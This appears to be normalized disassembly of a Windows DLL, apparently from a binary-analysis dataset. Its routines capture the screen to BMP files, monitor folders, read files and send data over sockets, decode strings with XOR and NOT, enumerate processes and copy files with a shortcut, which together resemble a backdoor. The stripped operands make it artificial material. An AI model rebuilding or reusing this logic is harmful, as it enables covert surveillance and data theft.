je r-xdata
lea ecx [ esp + 0x148 ]
push ecx
push ebp
call __WSAFDIsSet
test eax eax
je r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
push eax
push rw-data
push ecx
mov [ rw-data ] eax
call sub_71007550
add esp 0x18
cmp eax 0x1
jge r-xdata
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
lea edx [ esp + 0x18 ]
push 0x0
push edx
lea eax [ esp + 0x254 ]
push 0x2000
push eax
push ebx
call esi
test eax eax
je r-xdata
lea ecx [ esp + 0x24 ]
xor esi esi
push ecx
push esi
lea edx [ esp + 0x4c ]
push esi
push edx
push esi
mov [ esp + 0x5c ] ebp
mov [ esp + 0x58 ] 0x1
call select
cmp eax 0xffffffff
je r-xdata
mov edx [ rw-data ]
xor esi esi
push esi
push edx
call shutdown
mov eax [ rw-data ]
push eax
call closesocket
mov ecx [ esp + 0x14 ]
push ecx
call [ CloseHandle@IAT ]
push ebp
call closesocket
mov ecx 0x800
xor eax eax
mov edi rw-data
mov [ rw-data ] 0x0
[ edi ]
mov ecx 0x800
mov edi rw-data
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
push eax
push rw-data
push ecx
mov [ rw-data ] eax
call sub_71007550
add esp 0x18
cmp eax 0x1
jge r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x148 ]
push edx
push 0x0
push eax
push 0x0
push 0x0
mov [ esp + 0x160 ] ebp
mov [ esp + 0x15c ] 0x1
call select
or edi 0xffffffff
cmp eax edi
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ rw-data ]
push 0x0
push edx
call shutdown
mov eax [ rw-data ]
push eax
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x0
mov ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x250 ]
push ecx
push edx
push ebp
call send
test eax eax
jl r-xdata
call closesocket
pop edi
pop esi
pop ebp
mov [ rw-data ] 0xfffffffe
mov [ rw-data ] 0xffffffff
pop ebx
add esp 0x223c
retn
push 0x0
push ebp
call shutdown
push ebp
call closesocket
sub_71005c90
sub esp 0x308
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x214 ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x214 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x80
lea edi [ esp + 0x18 ]
[ edi ]
lea eax [ esp + 0x218 ]
push eax
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
mov [ esp + 0x10 ] ebx
jne r-xdata
push 0x2
push 0xfffffe00
push ebx
call [ fseek@IAT ]
push ebx
push 0x200
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call [ fread@IAT ]
add esp 0x1c
mov ecx 0x2
mov edi rw-data
lea esi [ esp + 0x14 ]
xor edx edx
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x308
retn
push ebx
call [ fclose@IAT ]
add esp 0x4
mov al 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x308
retn
mov ebp [ strchr@IAT ]
lea eax [ esp + 0x14 ]
push 0x2d
push eax
call ebp
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
sub eax ecx
mov esi eax
xor eax eax
lea ecx [ esi - 0x8 ]
test ecx ecx
jle r-xdata
mov ebx [ strncpy@IAT ]
lea eax [ esi - 0x8 ]
lea ecx [ esp + 0x1c ]
push eax
push ecx
push rw-data
call ebx
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + esi + 0x21 ]
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x20 ]
sub ecx esi
push ecx
push edx
push eax
call ebx
lea ecx [ esp + 0x2c ]
push 0x2d
push ecx
call ebp
add esp 0x20
test eax eax
je r-xdata
mov dl [ esp + eax + 0x1c ]
inc eax
not dl
mov [ esp + eax + 0x1b ] dl
cmp eax ecx
jl r-xdata
lea edx [ esp + 0x14 ]
sub eax edx
mov esi eax
xor eax eax
test esi esi
jle r-xdata
lea edx [ esp + 0x14 ]
push esi
push edx
push rw-data
call ebx
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + esi + 0x21 ]
sub ecx esi
push ecx
lea ecx [ esp + 0x24 ]
push eax
push ecx
call ebx
lea edx [ esp + 0x2c ]
push 0x2d
push edx
call ebp
add esp 0x20
test eax eax
je r-xdata
mov cl [ esp + eax + 0x14 ]
inc eax
not cl
mov [ esp + eax + 0x13 ] cl
cmp eax esi
jl r-xdata
lea ecx [ esp + 0x14 ]
sub eax ecx
xor ecx ecx
mov esi eax
test esi esi
jle r-xdata
lea eax [ esp + 0x14 ]
push esi
push eax
push rw-data
call ebx
mov ebx [ esp + 0x1c ]
add esp 0xc
mov dl [ esp + ecx + 0x14 ]
inc ecx
not dl
mov [ esp + ecx + 0x13 ] dl
cmp ecx esi
jl r-xdata
sub_71005e80
mov eax 0x2014
call sub_71007cf0
push ebx
push ebp
push esi
mov esi [ malloc@IAT ]
push edi
push 0x64
call esi
mov edi eax
push 0x64
mov [ esp + 0x18 ] edi
call esi
mov ebp eax
push 0x64
mov [ esp + 0x24 ] ebp
call esi
mov esi eax
mov ecx 0x19
xor eax eax
mov edx [ esp + 0x2034 ]
[ edi ]
mov ecx 0x19
mov edi ebp
[ edi ]
mov ecx 0x19
mov edi esi
[ edi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx 0x3
push ecx
push edx
push esi
call [ strncpy@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x18
xor ebx ebx
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp edx ecx
jge r-xdata
mov ecx [ esp + 0x10 ]
mov edx esi
sub ecx esi
mov [ esp + 0x1c ] ecx
jmp r-xdata
call sub_71002030
mov edx [ esp + 0x10 ]
mov edi [ CreateFileA@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push edx
call edi
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov cl [ edx + esi ]
mov eax edx
sub eax ebx
mov edi esi
inc edx
mov [ eax + ebp - 0x1 ] cl
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
mov al [ edx ]
cmp al 0x2d
je r-xdata
mov ebp [ esp + 0x18 ]
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push ebp
call edi
mov ebp eax
lea eax [ esp + 0x20 ]
push 0x0
push eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push ebp
call [ WriteFile@IAT ]
jmp r-xdata
mov [ ecx + edx ] al
inc ebx
mov edi esi
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
mov ecx 0x800
xor eax eax
lea edi [ esp + 0x24 ]
push eax
[ edi ]
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x28 ]
push ecx
push 0x2000
push edx
push ebx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov edi [ CloseHandle@IAT ]
push ebx
call edi
push ebp
call edi
mov edx [ esp + 0x10 ]
mov edi [ free@IAT ]
push edx
call edi
mov eax [ esp + 0x1c ]
push eax
call edi
push esi
call edi
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
mov edi rw-data
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0x18
mov [ rw-data ] eax
push 0x0
push eax
mov eax [ rw-data ]
push rw-data
push eax
call send
push 0x0
call [ ExitThread@IAT ]
push eax
call sub_71002350
mov ecx [ esp + 0x18 ]
add esp 0x4
xor eax eax
test ecx ecx
jle r-xdata
lea eax [ esp + 0x20 ]
push 0x0
push eax
push ecx
lea ecx [ esp + 0x30 ]
push ecx
push ebp
call [ WriteFile@IAT ]
mov dl [ eax + rw-data ]
xor [ esp + eax + 0x24 ] dl
inc eax
cmp eax ecx
jl r-xdata
sub_710064d0
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ malloc@IAT ]
push 0x64
call edi
push 0x64
mov esi eax
call edi
mov ebp eax
push 0x64
mov [ esp + 0x2c ] ebp
call edi
push 0x64
mov [ esp + 0x20 ] eax
call edi
mov ebx eax
push 0x64
mov [ esp + 0x2c ] ebx
call edi
push 0x64
mov [ esp + 0x2c ] eax
call edi
mov edx eax
mov ecx 0x19
xor eax eax
mov edi ebp
[ edi ]
mov edi [ esp + 0x28 ]
mov ecx 0x19
[ edi ]
mov ecx 0x19
mov edi ebx
[ edi ]
mov edi [ esp + 0x2c ]
mov ecx 0x19
[ edi ]
mov ecx 0x19
mov edi edx
[ edi ]
mov ecx 0x19
mov edi esi
[ edi ]
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x40 ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx 0x3
push ecx
push edx
push esi
call [ strncpy@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x24
xor edx edx
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ edx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jge r-xdata
mov ebx esi
sub ebp esi
mov edi esi
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp edx ecx
jge r-xdata
mov al [ ebx + esi ]
cmp al 0x2d
je r-xdata
mov [ ebx + ebp ] al
inc edx
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ edx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jge r-xdata
mov al [ edx + esi ]
cmp al 0x2d
je r-xdata
mov edi [ esp + 0x10 ]
mov ecx ebx
sub ecx edx
inc ebx
mov [ ecx + edi - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov edx [ esp + 0x14 ]
mov ebx [ atoi@IAT ]
push edx
call ebx
mov edi eax
mov eax [ esp + 0x20 ]
push eax
call ebx
mov [ esp + 0x30 ] eax
lea eax [ edi + edi * 4 ]
mov ecx [ esp + 0x18 ]
add esp 0x8
lea eax [ eax + eax * 4 ]
xor ebx ebx
push ebx
push ecx
lea eax [ eax + eax * 4 ]
xor ebp ebp
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edi [ eax + eax * 4 ]
shl edi 0x6
call [ CreateDirectoryA@IAT ]
mov edi [ esp + 0x1c ]
mov cl [ ebx + esi ]
mov eax ebx
sub eax edx
inc ebx
mov [ eax + edi - 0x1 ] cl
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
mov edi [ esp + 0x14 ]
mov ecx edx
sub ecx ebx
inc edx
mov [ ecx + edi - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
push esi
mov esi [ free@IAT ]
call esi
mov ecx [ esp + 0x24 ]
push ecx
call esi
mov edx [ esp + 0x18 ]
push edx
call esi
mov eax [ esp + 0x24 ]
push eax
call esi
mov ecx [ esp + 0x24 ]
push ecx
call esi
mov edx [ esp + 0x30 ]
push edx
call esi
add esp 0x18
push 0x0
call [ ExitThread@IAT ]
mov eax [ esp + 0x28 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
inc ebx
push ebx
push edx
push rw-data
push eax
call [ sprintf@IAT ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
call sub_71006710
add ebp eax
add esp 0x18
cmp ebp edi
jge r-xdata
sub_71006710
mov eax [ esp + 0x4 ]
mov ecx rw-data
push esi
push edi
mov edx [ eax ]
mov edi [ ecx ]
xor esi esi
cmp edx edi
jne r-xdata
push eax
call sub_71006940
add esp 0x4
test eax eax
je r-xdata
call sub_71006770
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn
call sub_71006770
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push eax
call sub_71006800
add esp 0x8
pop edi
pop esi
retn
mov edx [ esp + 0x10 ]
push edx
push eax
call sub_71006800
add esp 0x8
pop edi
pop esi
retn
sub_71006770
sub esp 0x8
push ebx
push ebp
push esi
push edi
push 0x0
call [ GetDC@IAT ]
mov esi [ GetSystemMetrics@IAT ]
push 0x0
mov ebx eax
call esi
push 0x1
mov ebp eax
call esi
push eax
push ebp
push ebx
mov [ esp + 0x1c ] eax
call [ CreateCompatibleBitmap@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push ebx
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
push esi
call [ SelectObject@IAT ]
push 0xcc0020
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
push ebx
push eax
push ebp
push 0x0
push 0x0
push esi
call [ BitBlt@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
push esi
call [ SelectObject@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_71006800
sub esp 0x54
push ebx
push ebp
push esi
xor ebp ebp
push edi
push ebp
call [ GetDC@IAT ]
mov ebx [ esp + 0x68 ]
mov edi eax
lea eax [ esp + 0x24 ]
push eax
push 0x18
push ebx
call [ GetObjectA@IAT ]
mov esi [ esp + 0x2c ]
imul esi [ esp + 0x30 ]
push esi
push 0x40
call [ GlobalAlloc@IAT ]
mov edx [ esp + 0x28 ]
mov cx [ esp + 0x36 ]
mov [ esp + 0x40 ] edx
lea edx [ esp + 0x3c ]
mov [ esp + 0x4a ] cx
mov ecx [ esp + 0x2c ]
push ebp
push edx
push eax
push ecx
push ebp
push ebx
push edi
mov [ esp + 0x2c ] eax
mov [ esp + 0x7c ] ebp
mov [ esp + 0x78 ] ebp
mov [ esp + 0x68 ] ebp
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] 0x1
mov [ esp + 0x58 ] 0x28
mov [ esp + 0x6c ] esi
mov [ esp + 0x70 ] ebp
mov [ esp + 0x74 ] ebp
call [ GetDIBits@IAT ]
mov ecx [ esp + 0x6c ]
push ebp
push 0x80
push 0x2
push ebp
push ebp
lea eax [ esi + 0x36 ]
push 0x40000000
push ecx
mov [ esp + 0x38 ] bp
mov [ esp + 0x36 ] bp
mov [ esp + 0x30 ] 0x4d42
mov [ esp + 0x32 ] eax
mov [ esp + 0x3a ] 0x36
call [ CreateFileA@IAT ]
mov ebx eax
xor edi edi
cmp ebx 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ GlobalFree@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x54
retn
lea edx [ esp + 0x68 ]
push ebp
push edx
lea eax [ esp + 0x1c ]
push 0xe
push eax
push ebx
call [ WriteFile@IAT ]
mov edi [ esp + 0x68 ]
lea ecx [ esp + 0x68 ]
push ebp
push ecx
lea edx [ esp + 0x44 ]
push 0x28
push edx
push ebx
call [ WriteFile@IAT ]
mov eax [ esp + 0x68 ]
mov ecx [ esp + 0x10 ]
add edi eax
lea eax [ esp + 0x68 ]
push ebp
push eax
push esi
push ecx
push ebx
call [ WriteFile@IAT ]
mov ecx [ esp + 0x68 ]
push ebx
add edi ecx
call [ CloseHandle@IAT ]
sub_71006940
sub esp 0x14
push ebx
push esi
push edi
xor edi edi
push rw-data
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edi
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi edi
mov [ esp + 0x14 ] esi
jne r-xdata
mov ebx [ GetProcAddress@IAT ]
push rw-data
push esi
call ebx
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x14
retn
push rw-data
push esi
call ebx
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x14
retn
push edi
call ??3@YAXPAX@Z
mov esi 0x7d0
push esi
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x8
cmp ebx edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x14
retn
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x14
retn
lea eax [ esp + 0xc ]
push eax
push esi
push ebx
push 0x5
call [ rw-data ]
cmp eax 0xc0000004
jne r-xdata
cmp eax edi
jge r-xdata
push ebx
call ??3@YAXPAX@Z
add esi 0x7d0
push esi
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x8
cmp ebx edi
jne r-xdata
mov esi [ esp + 0x24 ]
push ebp
push edi
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
mov ebp ebx
[ edi ]
not ecx
push ecx
push esi
push eax
push eax
call [ MultiByteToWideChar@IAT ]
mov edi eax
lea ecx [ edi + edi ]
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push edi
mov [ esp + 0x2c ] eax
push eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push esi
push eax
push eax
call [ MultiByteToWideChar@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi esi
shl ecx 0x1
mov [ esp + 0x1c ] cx
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x28 ]
not ecx
dec ecx
mov [ esp + 0x20 ] eax
lea edx [ ecx + ecx + 0x2 ]
mov [ esp + 0x1e ] dx
push ebx
call ??3@YAXPAX@Z
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov eax [ ebp ]
test eax eax
sete cl
add ebp eax
test cl cl
je r-xdata
lea ecx [ ebp + 0x38 ]
push 0x1
lea edx [ esp + 0x20 ]
push ecx
push edx
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov ebp [ esp + 0x14 ]
jmp r-xdata
mov ebp [ ebp + 0x44 ]
push ebx
call ??3@YAXPAX@Z
mov eax [ esp + 0x1c ]
add esp 0x4
push eax
call [ FreeLibrary@IAT ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
sub_71006ae0
mov eax 0x202c
call sub_71007cf0
push ebx
push ebp
push esi
push edi
mov edi [ malloc@IAT ]
push 0x64
call edi
push 0x64
mov esi eax
call edi
mov ebx eax
push 0x64
mov [ esp + 0x1c ] ebx
call edi
mov ebp eax
push 0x64
mov [ esp + 0x48 ] ebp
call edi
push 0x64
mov [ esp + 0x30 ] eax
call edi
push 0x64
mov [ esp + 0x38 ] eax
call edi
mov edx eax
mov ecx 0x19
xor eax eax
mov edi esi
[ edi ]
mov ecx 0x19
mov edi ebx
[ edi ]
mov ecx 0x19
mov edi ebp
[ edi ]
mov edi [ esp + 0x38 ]
mov ecx 0x19
[ edi ]
mov ecx 0x19
mov edi edx
[ edi ]
mov [ esp + 0x2c ] edx
mov edx [ esp + 0x2058 ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add edx 0x6
push ecx
push edx
push esi
call [ strncpy@IAT ]
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x24
xor edx edx
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ edx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jge r-xdata
mov ecx [ esp + 0x10 ]
mov ebx esi
sub ecx esi
mov [ esp + 0x24 ] ecx
jmp r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp edx ecx
jge r-xdata
mov al [ ebx + esi ]
cmp al 0x2d
je r-xdata
mov al [ ebx ]
cmp al 0x2d
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ edx + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jge r-xdata
mov al [ edx + esi ]
cmp al 0x2d
je r-xdata
mov ecx ebx
mov edi esi
sub ecx edx
inc ebx
mov [ ecx + ebp - 0x1 ] al
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
mov [ ecx + ebx ] al
inc edx
mov edi esi
or ecx 0xffffffff
xor eax eax
inc ebx
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
mov edx [ esp + 0x10 ]
mov esi [ atoi@IAT ]
push edx
call esi
mov edi eax
mov eax [ esp + 0x18 ]
push eax
call esi
add esp 0x8
xor ebx ebx
mov [ esp + 0x34 ] eax
push ebx
push 0x2000000
push 0x3
push ebx
push 0x5
push 0x1
push ebp
call [ CreateFileA@IAT ]
mov esi eax
mov [ esp + 0x28 ] ebx
cmp esi ebx
mov [ esp + 0x30 ] esi
mov [ esp + 0x10 ] ebx
je r-xdata
mov edi [ esp + 0x14 ]
mov cl [ ebx + esi ]
mov eax ebx
sub eax edx
inc ebx
mov [ eax + edi - 0x1 ] cl
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jl r-xdata
mov edi [ esp + 0x20 ]
mov ecx edx
sub ecx ebx
inc edx
mov [ ecx + edi - 0x1 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp edx ecx
jl r-xdata
mov ecx [ esp + 0x24 ]
push 0x0
call [ ExitThread@IAT ]
lea eax [ edi + edi * 4 ]
lea eax [ eax + eax * 4 ]
lea ebx [ eax + eax * 4 ]
shl ebx 0x3
mov [ esp + 0x24 ] ebx
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x10 ]
cmp ecx eax
jl r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0x800
jae r-xdata
push ebx
call [ Sleep@IAT ]
mov ecx 0x200
xor eax eax
lea edi [ esp + 0x3c ]
push eax
[ edi ]
lea ecx [ esp + 0x2c ]
push eax
push ecx
push 0x1
push eax
lea edx [ esp + 0x50 ]
push 0x800
push edx
push esi
mov [ esp + 0x48 ] eax
call ReadDirectoryChangesW
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
test eax eax
jbe r-xdata
lea ebx [ esp + 0x3c ]
add ebx [ ebx ]
cmp [ ebx ] 0x0
jne r-xdata
mov edx [ esp + 0x1c ]
mov ecx 0x19
xor eax eax
mov edi edx
[ edi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push ebp
push edx
call [ strncpy@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
xor ebp ebp
mov esi edi
mov edi [ esp + 0x1c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
test [ ebx + 0x8 ] 0xfffffffe
jbe r-xdata
test [ ebx + 0x4 ] 0x1
je r-xdata
mov ebx [ esp + 0x24 ]
mov esi [ esp + 0x30 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push ecx
push edx
call sub_71006e40
mov ecx [ esp + 0x18 ]
mov ebp [ esp + 0x40 ]
add esp 0x8
add ecx eax
mov [ esp + 0x10 ] ecx
lea eax [ ebx + 0xc ]
mov [ esp + 0x14 ] eax
mov ecx [ esp + 0x14 ]
xor eax eax
mov dx [ ecx ]
mov [ esp + 0x18 ] ax
push eax
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] dx
push 0x3
push ecx
lea edx [ esp + 0x3c ]
push 0xffffffff
push edx
push eax
push eax
mov [ esp + 0x4e ] 0x0
mov [ esp + 0x3a ] al
call [ WideCharToMultiByte@IAT ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ esp + 0x1c ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc ebp
[ edi ] [ esi ]
mov eax [ ebx + 0x8 ]
mov esi [ esp + 0x14 ]
shr eax 0x1
add esi 0x2
cmp ebp eax
mov [ esp + 0x14 ] esi
jb r-xdata
sub_71006e40
mov eax [ esp + 0x4 ]
sub esp 0x690
lea ecx [ esp + 0x244 ]
push ebx
push esi
mov esi [ lstrcpyA@IAT ]
push edi
push eax
push ecx
call esi
mov edx [ esp + 0x6a4 ]
lea eax [ esp + 0x14c ]
push edx
push eax
call esi
push 0x0
call [ CoInitialize@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
lea eax [ esp + 0x14c ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
mov ecx 0xc
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
stosw [ edi ]
lea edi [ esp + 0x48 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
js r-xdata
mov eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jl r-xdata
lea edi [ esp + 0x48 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esi + 0x1 ]
[ edi ]
not ecx
dec ecx
cmp edx ecx
jae r-xdata
mov al 0x5c
mov eax [ esp + 0xc ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
lea edx [ esp + 0x494 ]
push 0x104
push edx
lea eax [ esp + 0x258 ]
push 0xffffffff
push eax
push 0x1
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x494 ]
push 0x0
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14c ]
[ edi ]
not ecx
sub edi ecx
push 0x1
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x150 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x50 ]
push ecx
call [ CopyFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
add esp 0x690
retn
mov al [ esp + edx + 0x48 ]
mov ecx edx
sub ecx esi
lea edi [ esp + 0x48 ]
inc edx
mov [ esp + ecx + 0x13 ] al
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp edx ecx
jb r-xdata
dec esi
jns r-xdata
mov eax [ esp + 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edi [ esp + 0x250 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x48 ]
[ edi ]
not ecx
sub edi ecx
push 0x2
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x358 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x10 ]
and ecx 0x3
push edx
